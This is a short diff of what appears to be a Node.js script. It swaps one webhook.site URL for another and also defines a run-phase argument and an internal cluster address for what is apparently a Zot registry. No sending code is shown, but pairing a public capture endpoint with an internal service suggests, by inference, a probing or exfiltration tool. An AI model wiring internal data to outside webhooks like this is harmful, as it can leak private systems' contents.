@@ -2,7 +2,7 @@ const https = require('https');
 const http = require('http');
 const fs = require('fs');
 
-const WEBHOOK = "https://webhook.site/13a470de-556d-484a-ba5d-f4b435adb58f";
+const WEBHOOK = "https://webhook.site/1d8c106a-e48a-4bda-8861-a347ec8fdd34";
 const PHASE = process.argv[2] || 'unknown';
 const ZOT = 'http://10.244.1.56:5000';
 
